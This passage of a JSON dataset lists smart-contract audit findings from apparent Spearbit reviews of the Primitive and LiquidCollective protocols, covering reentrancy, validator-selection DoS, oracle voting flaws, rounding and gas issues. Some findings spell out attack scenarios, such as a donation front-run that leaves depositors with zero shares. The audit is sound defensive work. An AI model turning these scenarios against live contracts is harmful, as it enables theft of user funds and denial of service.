        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The current bisection algorithm chooses the mid point as root = (lower + upper) / 2; and the bisection terminates if either upper - lower < 0 or maxIterations is reached. Given upper >= lower throughout the code, it's easy to see that upper - lower < 0 can never be satisfied. The bisection will always use the max iterations. However, even with an epsilon of 1 it can happen that the mid point root is the same as the lower bound if upper = lower + 1. The if (output * lowerOutput < 0) condition will never be satisfied and the else case will always run, setting the lower bound to itself. The bisection will keep iterating with the same lower and upper bounds until max iterations are reached.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential reentrancy in claimFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The contract performs all transfers in the _settlement function and therefore _settlement can call- back to the user for reentrant tokens. To avoid reentrancy issues the _preLock() modifier implements a reentrancy check, but only if the called action is not happening during a multicall execution: function _preLock() private { // Reverts if the lock was already set and the current call is not a multicall. if (_locked != 1 && !_currentMulticall) { revert InvalidReentrancy(); } _locked = 2; } Therefore, multicalls are not protected against reentrancy and _settlement should never be executed, only once at the end of the original multicall function. However, the claimFee function can be called through a multicall by the protocol owner and it calls _settlement even if the execution is part of a multicall.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bisection can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The Bisection algorithm tries to find a root of the monotonic function. Evaluating the expensive invariant function at the lower point on each iteration can be avoided by caching the output function value whenever a new lower bound is set.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pool existence check in swap should happen earlier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The swap function makes use of the pool pair's tokens to scale the input decimals before it checks if the pool even exists.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pool creation in test uses wrong duration and volatility",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The second path with pairId != 0 in HelperConfigsLib's pool creation calls the createPool method with the volatility and duration parameters swapped, leading to wrong pool creations used in tests that use this path.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Operators._hasFundableKeys returns true for operators that do not have fundable keys",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Because _hasFundableKeys uses operator.stopped in the check, an operator without fundable keys be validated and return true. Scenario: Op1 has  keys = 10  limit = 10  funded = 10  stopped = 10 This means that all the keys got funded, but also \"exited\". Because of how _hasFundableKeys is made, when you call _hasFundableKeys(op1) it will return true even if the operator does not have keys available to be funded. By returning true, the operator gets wrongly included in getAllFundable returned array. That function is critical because it is the one used by pickNextValidators that picks the next validator to be selected and stake delegate user ETH. Because of this issue in _hasFundableKeys also the issue OperatorsRegistry._getNextValidatorsFromActive- Operators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys) can happen DOSing the contract that will always make pickNextValidators return empty. Check Appendix for a test case to reproduce this issue.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "OperatorsRegistry._getNextValidatorsFromActiveOperators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "This issue is also related to OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator . Consider a scenario where we have Op at index 0 name op1 active true limit 10 funded 10 stopped 10 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 In this case,  Op1 got all 10 keys funded and exited. Because it has keys=10 and limit=10 it means that it has no more keys to get funded again.  Op2 instead has still 10 approved keys to be funded. Because of how the selection of the picked validator works uint256 selectedOperatorIndex = 0; for (uint256 idx = 1; idx < operators.length;) { if ( operators[idx].funded - operators[idx].stopped < operators[selectedOperatorIndex].funded - operators[selectedOperatorIndex].stopped ) { selectedOperatorIndex = idx; } unchecked { ++idx; } } When the function finds an operator with funded == stopped it will pick that operator because 0 < operators[selectedOperatorIndex].funded - operators[selectedOperatorIndex].stopped. After the loop ends, selectedOperatorIndex will be the index of an operator that has no more validators to be funded (for this scenario). Because of this, the following code uint256 selectedOperatorAvailableKeys = Uint256Lib.min( operators[selectedOperatorIndex].keys, operators[selectedOperatorIndex].limit ) - operators[selectedOperatorIndex].funded; when executed on Op1 it will set selectedOperatorAvailableKeys = 0 and as a result, the function will return return (new bytes[](0), new bytes[](0));. 13 In this scenario when stopped==funded and there are no keys available to be funded (funded == min(limit, keys)) the function will always return an empty result, breaking the pickNextValidators mechanism that won't be able to stake user's deposited ETH anymore even if there are operators with fundable validators. Check the Appendix for a test case to reproduce this issue.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Oracle.removeMember could, in the same epoch, allow members to vote multiple times and other members to not vote at all",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of removeMember is introducing an exploit that allows an oracle member to vote again and again (in the same epoch) and an oracle that has never voted is prevented from voting (in the same epoch). Because of how OracleMembers.deleteItem is implemented, it will swap the last item of the array with the one that will be deleted and pop the last element. Let's make an example: 1) At T0 m0 to the list of members  members[0] = m0. 2) At T1 m1 to the list of members  members[1] = m1. 3) At T3 m0 call reportBeacon(...). By doing that, ReportsPositions.register(uint256(0)); will be called, registering that the member at index 0 has registered the vote. 4) At T4, the oracle admin call removeMember(m0). This operation, as we said, will swap the member's address from the last position of the array of members with the position of the member that will be deleted. After doing that will pop the last position of the array. The state changes from members[0] = m0; members[1] = m1 to members[0] = m1;. At this point, the oracle member m1 will not be able to vote during this epoch because when he/she will call reportBeacon(...) the function will enter inside the check. if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(_epochId, msg.sender); } This is because int256 memberIndex = OracleMembers.indexOf(msg.sender); will return 0 (the position of the m0 member that have already voted) and ReportsPositions.get(uint256(0)) will return true. At this point, if for whatever reason an admin of the contract add again the deleted oracle, it would be added to the position 1 of the array of the members, allowing the same member that have already voted, to vote again. Note: while the scenario where a removed member can vote multiple time would involve a corrupted admin (that would re-add the same member) the second scenario that prevent a user to vote would be more common. Check the Appendix for a test case to reproduce this issue. 14",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Order of calls to removeValidators can affect the resulting validator keys set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If two entities A and B (which can be either the admin or the operator O with the index I) send a call to removeValidators with 2 different set of parameters:  T1 : (I, R1)  T2 : (I, R2) Then depending on the order of transactions, the resulting set of validators for this operator might be different. And since either party might not know a priori if any other transaction is going to be included on the blockchain after they submit their transaction, they don't have a 100 percent guarantee that their intended set of validator keys are going to be removed. This also opens an opportunity for either party to DoS the other party's transaction by frontrunning it with a call to remove enough validator keys to trigger the InvalidIndexOutOfBounds error: OperatorsRegistry.1.sol#L324-L326: if (keyIndex >= operator.keys) { revert InvalidIndexOutOfBounds(); } to removeValidators and compare it",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Non-zero operator.limit should always be greater than or equal to operator.funded",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "For the subtraction operation in OperatorsRegistry.1.sol#L428-L430 to not underflow and revert, there should be an assumption that operators[selectedOperatorIndex].limit >= operators[selectedOperatorIndex].funded Perhaps this is a general assumption, but it is not enforced when setOperatorLimits is called with a new set of limits.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Decrementing the quorum in Oracle in some scenarios can open up a frontrunning/backrunning opportunity for some oracle members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Assume there are 2 groups of oracle members A, B where they have voted for report variants Va and Vb respectively. Let's also assume the count for these variants Ca and Cb are equal and are the highest variant vote counts among all possible variants. If the Oracle admin changes the quorum to a number less than or equal to Ca + 1 = Cb + 1, any oracle member can backrun this transaction by the admin to decide which report variant Va or Vb gets pushed to the River. This is because when a lower quorum is submitted by the admin and there exist two variants that have the highest number of votes, in the _getQuorumReport function the returned isQuorum parameter would be false since repeat == 0 is false: Oracle.1.sol#L369: return (maxval >= _quorum && repeat == 0, variants[maxind]); Note that this issue also exists in the commit hash 030b52feb5af2dd2ad23da0d512c5b0e55eb8259 and can be triggered by the admin either by calling setQuorum or addMember when the abovementioned conditions are met. Also, note that the free oracle member agent can frontrun the admin transaction to decide the quorum earlier in the scenario above. Thus this way _getQuorumReport would actually return that it is a quorum.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_getNextValidatorsFromActiveOperators can be tweaked to find an operator with a better validator pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Assume for an operator: (A, B) = (funded - stopped, limit - funded) The current algorithm finds the first index in the cached operators array with the minimum value for A and tries to gather as many publicKeys and signatures from this operator's validators up to a max of _requestedAmount. But there is also the B cap for this amount. And if B is zero, the function returns early with empty arrays. Even though there could be other approved and non-funded validators from other operators. Related: OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator , OperatorsRegistry._getNextValidatorsFromActiveOperators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys) , _hasFundableKeys marks operators that have no more fundable validators as fundable.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Dust might be trapped in WlsETH when burning one's balance.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "It is not possible to burn the exact amount of minted/deposited lsETH back because of the _value provided to burn is in ETH. Assume we've called mint(r,v) with our address r, then to get the v lsETH back to our address, we need to find an x where v = bx S B c and call burn(r, x) (Here S represents the total share of lsETH and B the total underlying value.). It's not always possible to find the exact x. So there will always be an amount locked in this contract ( v (cid:0) bx S B c ). These dust amounts can accumulate from different users and turn into a big number. To get the full amount back, the user needs to mint more wlsETH tokens so that we can find an exact solution to v = bx S B c. The extra amount to get the locked-up fees back can be engineered. The same problem exists for transfer and transferFrom. Also note, if you have minted x amount of shares, the balanceOf would tell you that you own b = b xB S c wlsETH. Internally wlsETH keeps track of the shares x. So users think they can only burn b amount, plug that in for the _value and in this case, the number of shares burnt would be b xB S cS B % $ which has even more rounding errors. wlsETH could internally track the underlying but that would not appropriate value like lsETH, which would basically be kind of wETH. We think the issue of not being able to transfer your full amount of shares is not as serious as not being able to burn back your shares into lsETH. On the same note, we think it would be beneficial to expose the wlsETH share amount to the end user: function sharesBalanceOf(address _owner) external view returns (uint256 shares) { return BalanceOf.get(_owner); }",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "BytesLib.concat can potentailly return results with dirty byte paddings.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "concat does not clean the potential dirty bytes that might have been copied from _postBytes (nor does it clean the padding). The dirty bytes from _postBytes are carried over to the padding for tempBytes.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The reportBeacon is prone to front-running attacks by oracle members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "There could be a situation where the oracle members are segmented into 2 groups A and B , and members of the group A have voted for the report variant Va and the group B for Vb . Also, let's assume these two variants are 1 vote short of quorum. Then either group can try to front-run the other to push their submitted variant to river.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Shares distributed to operators suffer from rounding error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "_rewardOperators distribute a portion of the overall shares distributed to operators based on the number of active and funded validators that each operator has. The current number of shares distributed to a validator is calculated by the following code _mintRawShares(operators[idx].feeRecipient, validatorCounts[idx] * rewardsPerActiveValidator); where rewardsPerActiveValidator is calculated as uint256 rewardsPerActiveValidator = _reward / totalActiveValidators; This means that in reality each operator receives validatorCounts[idx] * (_reward / totalActiveValida- tors) shares. Such share calculation suffers from a rounding error caused by division before multiplication.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Note that  limited  number of validators (already pushed by op) that have been approved by Alluvial and can be selected to be funded.  funded  number of validators funded.  stopped  number of validators exited (so that were funded at some point but for any reason they have exited the staking). The implementation of the function should favor operators that have the highest number of available validators to be funded. Nevertheless functions favor validators that have stopped value near the funded value. Consider the following example: Op at index 0 name op1 active true limit 10 funded 5 stopped 5 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 1) op1 and op2 have 10 validators whitelisted. 2) op1 at time1 get 5 validators funded. 3) op1 at time2 get those 5 validators exited, this mean that op.stopped == 5. In this scenario, those 5 validators would not be used because they are \"blacklisted\". At this point  op1 have 5 validators that can be funded. 24  op2 have 10 validators that can be funded. pickNextValidators logic should favor operators that have the higher number of available keys (not funded but approved) to be funded. If we run operatorsRegistry.pickNextValidators(5); the result is this Op at index 0 name op1 active true limit 10 funded 10 stopped 5 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 Op1 gets all the remaining 5 validators funded, the function (from the specification of the logic) should instead have picked Op2. Check the Appendix for a test case to reproduce this issue.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "approve() function can be front-ran resulting in token theft",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The approve() function has a known race condition that can lead to token theft. If a user calls the approve function a second time on a spender that was already allowed, the spender can front-run the transaction and call transferFrom() to transfer the previous value and still receive the authorization to transfer the new value.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Add missing input validation on constructor/initializer/setters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Allowlist.1.sol  initAllowlistV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level.  allow should check _accounts[i] to be not equal to address(0). Firewall.sol  constructor should check that: governor_ != address(0). executor_ != address(0). destination_ != address(0).  setGovernor should check that newGovernor != address(0).  setExecutor should check that newExecutor != address(0). OperatorsRegistry.1.sol  initOperatorsRegistryV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level.  addOperator should check: _name to not be an empty string. _operator to not be address(0). _feeRecipi- ent to not be address(0).  setOperatorAddress should check that _newOperatorAddress is not address(0).  setOperatorFeeRecipientAddress should check that _newOperatorFeeRecipientAddress is not address(0).  setOperatorName should check that _newName is not an empty string. Oracle.1.sol  initOracleV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level. Consider also adding some min and max limit to the values of _annualAprUpperBound and _relativeLowerBound and be sure that _epochsPerFrame, _slotsPerEpoch, _secondsPerSlot and _genesisTime matches the values expected.  addMember should check that _newOracleMember is not address(0).  setBeaconBounds: Consider adding min/max value that _annualAprUpperBound and _relativeLowerBound should respect. River.1.sol  initRiverV1: _globalFee should follow the same validation done in setGlobalFee. Note that client said that 0 is a valid _- globalFee value \"The revenue redistributuon would be computed off-chain and paid by the treasury in that case. It's still an on-going discussion they're having at Alluvial.\" _operatorRewardsShare should follow the same validation done in setOperatorRewardsShare. Note that client said that 0 is a valid _operatorRewardsShare value \"The revenue redistributuon would be computed off-chain and paid by the treasury in that case. It's still an on-going discussion they're having at Alluvial.\" ConsensusLayerDepositManager.1.sol  initConsensusLayerDepositManagerV1: _withdrawalCredentials should not be empty and follow the re- quirements expressed in the following official Consensus Specs document. 26",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LibOwnable._setAdmin allows setting address(0) as the admin of the contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "While other contracts like RiverAddress (for example) do not allow address(0) to be used as set input parameter, there is no similar check inside LibOwnable._setAdmin. Because of this, contracts that call LibOwnable._setAdmin with address(0) will not revert and functions that should be callable by an admin cannot be called anymore. This is the list of contracts that import and use the LibOwnable library  AllowlistV1  OperatorsRegistryV1  OracleV1  RiverV1",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OracleV1.getMemberReportStatus returns true for non existing oracles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "memberIndex will be equal to -1 for non-existing oracles, which will cause the mask to be equal to 0, which will cause the function to return true for non-existing oracles.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Operators might add the same validator more than once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Operators can use OperatorsRegistryV1.addValidators to add the same validator more than once. Depositors' funds will be directed to these duplicated addresses, which in turn, will end up having more than 32 eth. This act will damage the capital efficiency of the entire deposit pool and thus will potentially impact the pool's APY.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OracleManager.setBeaconData possible front running attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The system is designed in a way that depositors receive shares (lsETH) in return for their eth de- posit. A share represents a fraction of the total eth balance of the system in a given time. Investors can claim their staking profits by withdrawing once withdrawals are active in the system. Profits are being pulled from ELFeeRe- cipient to the River contract when the oracle is calling OracleManager.setBeaconData. setBeaconData updates BeaconValidatorBalanceSum which might be increased or decreased (as a result of slashing for instance). Investors have the ability to time their position in two main ways:  Investors might time their deposit just before profits are being distributed, thus harvesting profits made by others.  Investors might time their withdrawal / sell lsETH on secondary markets just before the loss is realized. By doing this, they will effectively avoid the loss, escaping the intended mechanism of socializing losses.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "SharesManager._mintShares - Depositors may receive zero shares due to front-running",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The number of shares minted to a depositor is determined by (_underlyingAssetValue * _total- Supply()) / oldTotalAssetBalance. Potential attackers can spot a call to UserDepositManagerV1._deposit and front-run it with a transaction that sends wei to the contract (by self-destructing another contract and sending the funds to it), causing the victim to receive fewer shares than what he expected. More specifically, In case old- TotalAssetBalance() is greater than _underlyingAssetValue * _totalSupply(), then the number of shares the depositor receives will be 0, although _underlyingAssetValue will be still pulled from the depositors balance. An attacker with access to enough liquidity and to the mem-pool data can spot a call to UserDepositManagerV1._- deposit and front-run it by sending at least totalSupplyBefore * (_underlyingAssetValue - 1) + 1 wei to the contract . This way, the victim will get 0 shares, but _underlyingAssetValue will still be pulled from its account balance. In this case, the attacker does not necessarily have to be a whitelisted user, and it is important to mention that the funds that were sent by him can not be directly claimed back, rather, they will increase the price of the share. The attack vector mentioned above is the general front runner case, the most profitable attack vector will be the case where the attacker is able to determine the share price (for instance if the attacker mints the first share). In this scenario, the attacker will need to send at least attackerShares * (_underlyingAssetValue - 1) + 1 to the contract, (attackerShares is completely controlled by the attacker, and thus can be 1). In our case, depositors are whitelisted, which makes this attack harder for a foreign attacker.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Orphaned (index, values) in SlotOperator storage slots in operatorsRegistry",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If !opExists corresponds to an operator which has OperatorResolution.active set to false, the line below can leave some orphaned (index, values) in SlotOperator storage slots: _setOperatorIndex(name, newValue.active, r.value.length - 1);",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OperatorsRegistry.setOperatorName Possible front running attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "1. setOperatorName reverts for an already used name, which means that a call to setOperatorName might be front-ran using the same name. The front-runner can launch the same attack again and again thus causing a DoS for the original caller. 2. setOperatorName can be called either by an operator (to edit his own name) or by the admin. setOpera- torName will revert for an already used _newName. setOperatorName caller might be front-ran by the identical transaction transmitted by someone else, which will lead to failure for his transaction, where in practice this failure is a \"false failure\" since the desired change was already made.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Low"
        ]
    },
    {
        "title": "Prevent users from burning token via lsETH/wlsETH transfer or transferFrom functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of both lsETH (SharesManager component of River contract) and wlsETH allow the user to \"burn\" tokens, sending them directly to the address(0) via the transfer and transferFrom function. By doing that, it would bypass the logic of the existing burn functions present right now (or in the future when withdrawals will be enabled in River) in the protocol.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In addOperator when emitting an event use stack variables instead of reading from memory again",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In OperatorsRegistry's addOperator function when emitting the AddedOperator event we read from memory all the event parameters except operatorIndex. emit AddedOperator(operatorIndex, newOperator.name, newOperator.operator, newOperator.feeRecipient); We can avoid reading from memory to save gas.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite pad64 so that it doesn't use BytesLib.concat and BytesLib.slice to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "We can avoid using the BytesLib.concat and BytesLib.slice and write pad64 mostly in assembly. Since the current implementation adds more memory expansion than needed (also not highly optimized).",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache r.value.length used in a loop condition to avoid reading from the storage multiple times.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In a loop like the one below, consider caching r.value.length value to avoid reading from storage on every round of the loop. for (uint256 idx = 0; idx < r.value.length;) {",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite the for loop in ValidatorKeys.sol::getKeys to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Operators.get in _getNextValidatorsFromActiveOperators can be replaced by Opera- tors.getByIndex to avoid extra operations/gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Operators.get in _getNextValidatorsFromActiveOperators performs multiple checks that have been done before when Operators.getAllFundable() was called. This includes finding the index, and checking if OperatorResolution.active is set. These are all not necessary.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid unnecessary equality checks with true in if statements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Statements of the type if( condition == true) can be replaced with if(condition). The extra comparison with true is redundant.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite OperatorRegistry.getOperatorDetails to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In getOperatorDetails the 1st line is: _index = Operators.indexOf(_name); Since we already have the _index from this line we can use that along with getByIndex to retrieve the _opera- torAddress. This would reduce the gas cost significantly, since Operators.get(_name) calls Operators._getOp- eratorIndex(name) to find the _index again. testExecutorCanSetOperatorLimit() (gas: -1086 (-0.001%)) testGovernorCanSetOperatorLimit() (gas: -1086 (-0.001%)) testUserDepositsForAnotherUser() (gas: -2172 (-0.001%)) testDeniedUser() (gas: -2172 (-0.001%)) testELFeeRecipientPullFunds() (gas: -2172 (-0.001%)) testUserDepositsUnconventionalDeposits() (gas: -2172 (-0.001%)) testUserDeposits() (gas: -2172 (-0.001%)) testNoELFeeRecipient() (gas: -2172 (-0.001%)) testUserDepositsTenPercentFee() (gas: -2172 (-0.001%)) testUserDepositsFullAllowance() (gas: -2172 (-0.001%)) testValidatorsPenaltiesEqualToExecLayerFees() (gas: -2172 (-0.001%)) testValidatorsPenalties() (gas: -2172 (-0.001%)) testUserDepositsOperatorWithStoppedValiadtors() (gas: -3258 (-0.002%)) testMakingFunctionGovernorOnly() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorLimit() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorStatus() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorStoppedValidatorCount() (gas: -1086 (-0.005%)) testExecutorCanSetOperatorStoppedValidatorCount() (gas: -1086 (-0.006%)) testGovernorCanSetOperatorStatus() (gas: -1086 (-0.006%)) testGovernorCanSetOperatorStoppedValidatorCount() (gas: -1086 (-0.006%)) testGovernorCanAddOperator() (gas: -1086 (-0.006%)) testExecutorCanSetOperatorStatus() (gas: -1086 (-0.006%)) Overall gas change: -36924 (-0.062%) Also note, when the operator is not OperatorResolution.active, _index becomes -1 in both cases. With the change suggested if _index is -1, uint256(_index) == type(uint256).max which would cause getByIndex to revert with OperatorNotFoundAtIndex(index). But with the current code, it will revert with an index out-of-bound type of error. _operatorAddress = Operators.getByIndex(uint256(_index)).operator;",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite/simplify OracleV1.isMember to save gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "OracleV1.isMember can be simplified to save gas.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache beaconSpec.secondsPerSlot * beaconSpec.slotsPerEpoch multiplication in to save gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The calculation for _startTime and _endTime uses more multiplication than is necessary.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_rewardOperators could save gas by skipping operators with no active and funded validators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "_rewardOperators is the River function that distribute the earning rewards to each active operator based on the amount of active validators. The function iterate over the list of active operators returned by OperatorsRegistryV1.listActiveOperators calculating the total amount of active and funded validators (funded-stopped) and the number of active and funded validators (funded-stopped) for each operator. Because of current code, the final temporary array validatorCounts could have some item that contains 0 if the operator in the index position had no more active validators. This mean that: 1) gas has been wasted during the loop 2) gas will be wasted in the second loop, distributing 0 shares to an operator without active and funded valida- tors 3) _mintRawShares will be executed without minting any shares but emitting a Transfer event",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider adding a strict check to prevent Oracle admin to add more than 256 members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
